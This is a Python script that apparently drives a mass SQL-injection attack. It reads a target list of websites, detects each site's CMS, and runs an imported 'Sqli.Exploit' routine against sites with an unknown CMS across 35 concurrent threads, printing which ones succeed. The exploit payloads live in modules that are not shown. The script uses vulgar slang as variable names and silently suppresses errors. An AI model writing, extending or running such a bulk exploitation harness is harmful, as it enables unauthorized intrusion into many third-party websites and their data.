from concurrent.futures import ThreadPoolExecutor
import requests

from Tools import Sqli,cms

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'

def Rez(site, i):
    try:
        if 'YES' in str(i):
            print(' {}+ {}{} {} --> {}{} {}YES!{}'.format(g, w, site, c, y, i[2], g, w))
        else:
            print(' {}- {}{} {} --> {}{} {}NO!{}'.format(r, w, site, c, y, i[2], r, w))
    except:
        print(' {}- {}{} {}--> {}{} {}NO!{}'.format(r, w, site, c, y, i[2], r, w))

def threadsqli(site):
    try:
        if site.startswith('http://'):
            site = site.replace('http://', '')
        elif site.startswith("https://"):
            site = site.replace('https://', '')
        else:
            pass
        cekcms = cms.DetectCMS(site)
        if cekcms == 'unknown':
            i = Sqli.Exploit(site)
            Rez(site, i)
        else:
            pass
    except:
        pass
        #print(' {}- {}{} {}--> {} Crashed!{}'.format(r, w, site, c, y, w))

if __name__ == '__main__':
    ngentot = "../list-sqli.txt"
    memek = open(ngentot, 'r').read().splitlines()
    kontol = ThreadPoolExecutor(max_workers=35)
    for site in memek:
        site = site.rstrip()
        kontol.submit(threadsqli, site)

